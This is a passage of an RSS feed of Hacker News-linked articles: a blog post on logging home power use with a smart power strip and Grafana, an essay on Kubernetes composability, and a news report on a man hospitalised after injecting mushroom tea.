<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786607">thread link</a>) | @anuragpeshne
<br/>
January 14, 2021 | https://anuragpeshne.github.io/essays/energy-monitoring.html | <a href="https://web.archive.org/web/*/https://anuragpeshne.github.io/essays/energy-monitoring.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">


<p>
Recently, I became interested in measuring the electricity consumption
of electronic devices at my home and, in particular, my computer. Computer power
supplies are typically rated from 400W to 800W. I wanted to see how much power is
actually needed for day-to-day computing - writing code, browsing the Internet, playing
games, running ML jobs. And how does it compare with a laptop and other mobile devices.
</p>

<p>
As a kid, I was once told by an engineer that the bulk of the energy is consumed by
the monitor, and the desktop itself consumes lesser energy<sup><a id="fnr.1" href="#fn.1">1</a></sup>. So if I switch off
the monitor, I can play music, download things overnight without wasting too much
energy. This statement stuck with me over time as my bulky CRT monitor was replaced
with sleek LED monitors and a beefy 250W GPU got added to my desktop. It was time
I measure everything and find out if the engineer's statement still holds.
</p>


<div id="orgc5b562d">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/desktop.png" alt="desktop.png">
</p>
<p><span>Figure 1: </span>Desktop energy consumption on a weekend evening.</p>
</div>

<div id="outline-container-orga6a4ce1">
<h2 id="orga6a4ce1">Hardware</h2>
<div id="text-orga6a4ce1">
<p>
A quick search revealed that <a href="https://en.wikipedia.org/wiki/Kill_A_Watt">Kill A Watt</a> meters are one of the most popular ways
of measuring the energy consumption. I wanted to log the consumption so that I can
analyze the trends over time. That's why I passed these meters on. But these meters
have an inbuilt screen and do not require mobile or network access so they can
be a great solution if someone is looking for a quick way to see the consumption.
On the other end of the spectrum, there are some devices that can be plugged directly
into the circuit panel of the house and they can be used to analyze consumption
of all appliances in the house. For my goal of measuring energy consumption of
my computer, this was simply overkill and would not have provided the fine-grained
monitoring I needed (and I'm a little scared of messing with the AC power).
</p>

<p>
I finally settled on TP-Link Power Strip: <a href="https://www.kasasmart.com/us/products/smart-plugs/kasa-smart-wi-fi-power-strip-hs300">HS300</a>. This <i>smart</i> power strip has
the usual <i>smart</i> plug features, like, it can be controlled using a mobile app, but
it also has energy monitoring built-in. And most importantly there are some awesome projects
on Github - <a href="https://github.com/python-kasa/python-kasa">python-kasa</a>, <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a> - that have reverse engineered the communication
protocol and provide a nice interface to talk to them.
</p>
</div>
</div>

<div id="outline-container-org01d1f27">
<h2 id="org01d1f27">Software</h2>
<div id="text-org01d1f27">



<p>
Figure 2<sup><a id="fnr.2" href="#fn.2">2</a></sup> shows a high-level picture of how the energy consumption values
get extracted, stored and visualized.
</p>
</div>

<div id="outline-container-orgd7e2f19">
<h3 id="orgd7e2f19">Polling HS300</h3>
<div id="text-orgd7e2f19">
<p>
The project <a href="https://github.com/python-kasa/python-kasa">python-kasa</a> provides a nice interface to control TP-Link devices but there's
an <a href="https://github.com/python-kasa/python-kasa/issues/64">issue</a> with querying the energy monitor of child plugs. That's why I used the project <a href="https://github.com/GadgetReactor/pyHS100">pyHS100</a>
which seems like an older version of the python-kasa project. I added a cron job to query
the power strip every 5 minutes and dump the data in a text file, using a simple bash script:
</p>
<div>
<pre><code>#! /bin/bash

power=$(/home/pi/.local/bin/pyhs100 --strip --host &lt;IP of the power strip&gt; emeter | tail -n 1)
timestamp=$(date +%s)

echo -e "$timestamp, $power"
</code></pre>
</div>
<p>
This creates a bulky line for each sample it records and there is certainly a
lot of room to compress it. I'm currently sampling it every 5 minutes, so I don't
mind it, but if you are planning to sample it every minute or every few seconds,
you might want to trim it down.
</p>
</div>
</div>

<div id="outline-container-orgd23b686">
<h3 id="orgd23b686">Grafana Datasource</h3>
<p>
I'm using Grafana to visualize this data to see trends in usage over time. We
can dump all of the data into one of the Datasource that is supported by default
by Grafana but I did not like that extra step for such simple data. So I wrote
<a href="https://github.com/anuragpeshne/grafana-kasa-power-strip">my own backend datasource</a> that directly serves Grafana, data from the logs we
collected. This uses the <a href="https://grafana.com/grafana/plugins/grafana-simple-json-datasource">SimpleJson</a> datasource plugin.
</p>
</div>
</div>

<div id="outline-container-orgfc16d58">
<h2 id="orgfc16d58">Results</h2>
<p>
The results were informative and nothing less than an eye-opener for me. Some devices,
like computers, chargers, consume varying amounts of energy, and some devices, like
lamps, monitors, consume constant energy. I might write a follow-up post just
about the consumption of my computer running various workloads and applications.
Here are few that I found interesting:
</p>
<div id="outline-container-org12fd4a3">
<h3 id="org12fd4a3">Desktop: Coding vs video games</h3>
<div id="text-org12fd4a3">

<div id="org9712a5d">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/desktop.png" alt="desktop.png">
</p>
<p><span>Figure 3: </span>Desktop energy usage: coding, standby, then, playing video games</p>
</div>
<ul>
<li>In the first half, the computer was used for coding using a simple text editor with light browsing.</li>
<li>The drop represents the time it was put on sleep.</li>
<li>The increase during the later part corresponds with playing a low graphics
demanding game.</li>
</ul>
</div>
</div>
<div id="outline-container-orgdec0c27">
<h3 id="orgdec0c27">Monitor</h3>
<div id="text-orgdec0c27">

<div id="org105d4a8">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/monitor.png" alt="monitor.png">
</p>
<p><span>Figure 4: </span>Computer Monitor consumption: almost constant</p>
</div>
<ul>
<li>Energy consumption of my monitor is constant until I increased the brightness from 15% to 20%</li>
</ul>
</div>
</div>
<div id="outline-container-org928d531">
<h3 id="org928d531">Phone charging</h3>
<div id="text-org928d531">

<div id="orga4f7883">
<p><img src="https://anuragpeshne.github.io/assets/energyMonitoring/iphone_charging.png" alt="iphone_charging.png">
</p>
<p><span>Figure 5: </span>iPhone getting charged using the stock charger.</p>
</div>
<ul>
<li>This curve is interesting - an exponential decay.</li>
<li>Note the spikes too, maybe those correspond with the times the phone was picked up.</li>
</ul>
</div>
</div>
</div>

<div id="outline-container-org82c2bcb">
<h2 id="org82c2bcb">Conclusion</h2>
<div id="text-org82c2bcb">
<p>
The energy consumption of the monitor is just 10% - 25% of the desktop energy consumption.
So, although it might be still a good idea to turn off the monitor when things
are running in the background, monitors are not the major consumers anymore
(if they were at all earlier). It is interesting to note that the actual
consumption is much less than the rated wattage of the devices.
</p>

<p>
It is also interesting to note the difference in magnitude of the consumption.
So getting a gold rated PSU will have much more impact than having a more efficient
iPhone charger. But none of this matters when you are sitting next to a 3KW space heater ;)
</p>
</div>
</div>
<p><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" src="https://i.creativecommons.org/l/by/4.0/80x15.png"></a></p>

</div></div>]]>
            </description>
            <link>https://anuragpeshne.github.io/essays/energy-monitoring.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786607</guid>
            <pubDate>Fri, 15 Jan 2021 03:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Composability of software components is the biggest benefit of K8s]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25786449">thread link</a>) | @airocker
<br/>
January 14, 2021 | https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/ | <a href="https://web.archive.org/web/*/https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
    <div role="main">
      <div>
        




<article>
  <p><em>Pankaj Kumar</em></p>

<p><strong>Encapsulation in Kubernetes</strong></p>

<p>In 2018, for various reasons we moved our website to Kubernetes. When we started, we had little idea what Kubernetes had to offer. All we knew was that it can run a website based on containers that are full OS images. It is easier to move from one cloud provider to another. Cool! Little did we know the biggest advantage it offers: Encapsulation.</p>

<p>The biggest advantage of Kubernetes in my opinion is the encapsulation and composability of backend components. Any Saas product has to run a number of components from database, appserver, monitoring stack, pub/sub etc etc. Kubernetes makes everything a helm chart and some configuration away. The interfaces are neatly defined by the author of the helm chart and all the complexity is encapsulated well within a service. You could use many third party helm charts:
Monitoring: logging - Elasticsearch
Monitoring: metrics - Prometheus
Authentication - FusionAuth
Database - MongoDB
Chaos Monkey - Gremlin
CD - Argo
‚Ä¶
This abstraction of complexity lets every team focus on its unique IP and easily reuse third party components. Now why was it not possible before? VM images were too big, needed a lot of time to boot and it was hard to maintain a lot of them.</p>

<p>Composability is not just limited to third party components. Even your own code becomes very composable with well defined interfaces. Now how should we decide the boundary between two components in a Kubernetes cluster? The same priciples that apply in designing a database or paritioning a program to classes is useful here but with slightly different parameters. When we decide what should go into a class, we use the priciple of loose coupling and strong cohesion: The interface between classes
should be simple and the complexity can be captured inside the class. Also, strong cohesion means methods and properties inside the class should be related to each other: they should change together. A change in behavior should as much as possible be confined within the class.</p>

<p>Choosing the boundary of Kubernetes components depends on a few things apart from the Simplicity of the interface: 
Single process: Everything in one component should run as a single process/container. It should have the same dependencies. You dont really have to worry about this because you pretty much have little choice.
Configurability of the component: IF a configuration change requires the restart of certain parts, they should be in the same component.
Auto-scaling policies for the component. If one component is CPU bound and needs CPU scaling whereas other needs Memory based autoscaling, they should be in different components.
We should strive to decouple state of the containers from the runtime as much as possible, by using databases and volume claims. But ideally one component should not have too many different types of state.</p>

<p>It can also be thought of as taking a UML component diagram and giving each component a container of its own. The concept of components in UML closely resembles an image.</p>

<p>Now, let‚Äôs say someday that the component configuration is super easy and the  configuration/maintenance of these components rests in the hands of the creator of the component itself (for a fee of course).  The frontend app developer would go hire some of these backend components, configure them together and a new app is ready to run! The road will not be easy but this will be true low-code where complex services can be built by just knowing UI programming.</p>

</article>










  




      </div>
    </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786449</guid>
            <pubDate>Fri, 15 Jan 2021 02:58:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Man almost dies after self treatment with mushrooms]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786331">thread link</a>) | @seshagiric
<br/>
January 14, 2021 | https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/ | <a href="https://web.archive.org/web/*/https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
	<section id="primary">
		<main id="main" role="main">
				
		
<article id="post-19849">

	<!-- .entry-header -->

	<img width="820" height="360" src="https://mybestmedicine.com/wp-content/uploads/sites/13/2021/01/cfarmafotohiP2ud53Apg2xNB6uZbNe7-1200-80-820x360.jpg" alt="" loading="lazy">
	<div>

		<p>A man brewed a tea from ‚Äúmagic mushrooms‚Äù and injected the concoction into his veins; several days later, he ended up at the emergency department with the fungus growing in his blood.</p>
<p>The man spent 22 days in the hospital, with eight of those days in the intensive care unit (ICU), where he received treatment for multisystem organ failure. Now released, he is still being treated with a long-term regimen of antibiotic and antifungal drugs, according to a description of the case published Jan. 11 in the <u>Journal of the Academy of Consultation-Liaison Psychiatry</u>.&nbsp;</p>
<p>The case didn‚Äôt reveal whether injecting <u>shroom tea</u> can cause persistent psychoactive effects, as sometimes seen when people ingest the <u>fungus</u> orally, the doctors wrote in the report. For example, in rare cases, people can develop a condition called hallucinogen-induced persisting perception disorder (HPPD), where they experience vivid flashbacks of their trip long after the fact, <u>according to the National Institute on Drug Abuse</u>.&nbsp;</p>
<p>The case ‚Äúunderscores the need for ongoing public education regarding the dangers attendant to the use of this, and other drugs, in ways other than they are prescribed,‚Äù the doctors wrote.&nbsp;</p>

<p>By injecting shrooms into his bloodstream, the 30-year-old patient had hoped to relieve symptoms of bipolar disorder and opioid dependence, according to the report. His family members noted that he had recently stopped adhering to his prescribed bipolar medications and was ‚Äúcycling between depressive and manic states.‚Äù&nbsp;</p>
<p>The man found online reports that described the potential therapeutic effects of hallucinogens, such as <u>LSD</u> and psilocybin mushrooms, which prompted him to boil down shrooms into a ‚Äúmushroom tea.‚Äù He filtered the tea by drawing it through a ‚Äúcotton swab‚Äù before injecting it into his body. In the following days, he became lethargic and nauseated, and his skin began to yellow. He soon developed diarrhea and began vomiting blood.&nbsp;</p>
<p>His family found him and took him to the emergency room, noting concern that he also seemed very confused. The doctors noted that he could not participate in a meaningful interview, due to his altered mental state. Multiple organs, including the liver and kidneys, began to fail and the man was transferred to the ICU. His blood tested positive for a <u>bacterial</u> infection with the microbe <em>Brevibacillus </em>and a fungal infection from <em>Psilocybe cubensis </em>‚Äî meaning the magic mushroom he injected was now growing in his blood.</p>
<p>In addition to antibiotic and antifungal drugs, the man needed to be placed on a ventilator after he experienced acute respiratory failure, where fluid builds up in the air sacs of the lungs. Thankfully, the patient survived this ordeal and was later discharged from the hospital.</p>
<p>‚ÄîPsychiatry‚Äôs new guide: 6 things you should know</p>
<p>‚Äî10 of the strangest medical studies (in recent history, that is)</p>
<p>‚ÄîHypersex to hoarding: 7 new psychological disorders&nbsp;</p>
<p>Research suggests that psilocybin may be a promising treatment for <u>depression</u>, <u>anxiety</u> and substance abuse, the authors noted ‚Äî but only if taken safely. In most research studies, scientists administer the drug in pill form, but in a few instances, doctors have delivered psilocybin via an intravenous injection, according to a 2018 report published in the journal <u>Neuropharmacology</u>. But these injections are given in tightly controlled doses and under medical supervision, and they do not contain any fungi; the compound psilocybin, alone, is not alive and cannot grow in the body.</p>
<p>When used recreationally, magic mushrooms are typically made into a tea, eaten raw or dried, ground into a powder and put in capsules, or coated in chocolate ‚Äî they are not injected directly into the bloodstream. Shrooms induce mind-altering trips by interacting with certain receptors in the brain; specifically, the psilocybin breaks down into psilocin, a substance that acts like the brain chemical serotonin, which plays roles in mood and perception.</p>
<p>But a bad trip can trigger anxiety, fear and confusion, as well as elevated blood pressure, vomiting, headaches and stomach cramps, <u>Live Science previously reported</u>. Magic mushrooms carry an added risk because they resemble some species of poisonous mushroom, so people sometimes consume the wrong kind by mistake.&nbsp;</p>
<p>Several U.S. cities have decriminalized psilocybin, and in November 2020, Oregon moved to legalize its use as a therapeutic drug, <u>CNBC reported</u>. As of now, psilocybin is still classified as a ‚ÄúSchedule I substance‚Äù under federal law, meaning that the drug has no accepted medical use in the U.S. and has a ‚Äúhigh potential for abuse.‚Äù However, current research suggests that this potential for abuse has been historically overestimated and is actually quite low, according to the 2018 Neuropharmacology report.&nbsp;</p>
<p><em>Originally published on Live Science.</em>&nbsp;</p>
<p>Source: <a href="https://www.livescience.com/magic-mushroom-injection-case-report.html" target="_blank" rel="noopener noreferrer">Read Full Article</a></p>

<!-- AI CONTENT END 2 -->

		
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article>

<!-- #comments -->
		
		</main><!-- #main -->
	</section><!-- #primary -->
	
	
	<!-- #secondary -->

	
	
	</div></div>]]>
            </description>
            <link>https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786331</guid>
            <pubDate>Fri, 15 Jan 2021 02:44:35 GMT</pubDate>
        </item>
    </channel>
</rss>
